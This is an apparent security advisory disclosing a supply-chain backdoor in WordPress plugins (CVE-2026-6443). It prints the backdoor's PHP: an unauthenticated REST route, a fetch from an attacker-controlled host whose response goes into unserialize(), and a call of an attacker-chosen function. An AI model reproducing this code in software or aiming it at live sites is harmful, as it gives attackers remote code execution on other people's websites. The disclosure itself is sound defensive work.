---
title: "WordPress Backdoor"
vendor: "WordPress"
class: "Supply-chain backdoor"
severity: "Critical"
status: "Disclosed"
date: 2026-02-07
cve: "CVE-2026-6443"
link: "https://cooties.io/blog/project-umbra/"
summary: "Unauthenticated remote code execution. A backdoored plugin update added a public REST endpoint that fetches a payload from attacker infrastructure and passes it to unserialize(), leading to PHP object injection and code execution. CVSS 9.8, across every plugin from the compromised account."
---

## Background

The EssentialPlugin developer account, publishing around 31 plugins with over 400,000 combined installs, was sold on Flippa. The buyer shipped a backdoor in routine updates. The compromise was of the developer account rather than any individual site, so each plugin kept its existing install base and update channel.

The backdoor is contained in `wpos-analytics`, a bundled module presented as usage analytics. It is byte-for-byte identical in Accordion and Accordion Slider v1.4.5 and v1.4.6, so it predates the version that was reported. On affected sites it also injected SEO spam served to crawlers.

## The REST endpoint

`Wpos_Anylc_Admin::wpos_rest_api_init()` registers a REST route for each affected plugin:

```php
public function wpos_rest_api_init() {
    if ( !empty( $this->analytics_slugs ) ) {
        add_filter( 'rest_pre_serve_request', array($this, 'wpos_cors_headers'), 10, 3 );

        foreach ( $this->analytics_slugs as $product_slug ) {
            register_rest_route(
                $product_slug . '/v1',
                '/analytics/',
                array(
                    'methods'             => 'POST',
                    'callback'            => array( $this, 'wpos_handle_analytics_request' ),
                    'permission_callback' => '__return_true',
                )
            );
        }
    }
}
```

`permission_callback` is `'__return_true'`, so the route requires no authentication. An unauthenticated POST to `/{plugin-slug}/v1/analytics/` reaches `wpos_handle_analytics_request()`, which resolves the `productID` parameter to a loaded plugin and calls `fetch_ver_info()`.

## Deserialization of the remote response

`fetch_ver_info()` requests a URL on `analytics.essentialplugin.com`, hardcoded in `$this->analytics_endpoint`, and passes the response body to `unserialize()`:

```php
public $analytics_endpoint = 'https://analytics.essentialplugin.com';

public function fetch_ver_info( $product_id, $curr_version ) {
    $url = $this->analytics_endpoint . '/plugin_info/' . $product_id . '/'
         . '?version=' . urlencode($curr_version)
         . '&site_url=' . urlencode(get_site_url()) . '&live=1';
    $data = @file_get_contents($url);
    if (!$data) {
        $this->status = 'offline';
        return false;
    }

    $info = @unserialize($data);

    if ($info instanceof self) {
        $this->release_date  = $info->release_date;
        $this->status        = $info->status;
        $this->write         = $info->write;
        $this->version_cache = $info->version_cache;
        $this->changelog     = $info->changelog;
    }
    // ...
}
```

The endpoint is attacker infrastructure. The response body is unserialized without restriction. If the result is an instance of the class, its properties, including `write`, are copied onto `$this`.

## Code execution

`version_info_clean()` uses `$this->write` as a callable:

```php
public function version_info_clean() {
    if ($this->status === 'valid' && $this->changelog && !$this->isOutdated()) {
        $clean = $this->write;
        @$clean($this->version_cache, $this->changelog);
    }
}
```

`$clean($this->version_cache, $this->changelog)` calls the value of `$this->write` as a function. `write`, `version_cache`, and `changelog` all come from the unserialized response in `fetch_ver_info()`. The attacker controls the function that is called and both of its arguments. Combined with the unauthenticated REST route, this is remote code execution reachable by an unauthenticated request.

## Disclosure

The backdoor was identified in Accordion and Accordion Slider v1.4.6 before any CVE existed. CVE-2026-6443 (CVSS 9.8) was assigned later and covers every plugin published from the compromised account. WordPress.org removed all of them.
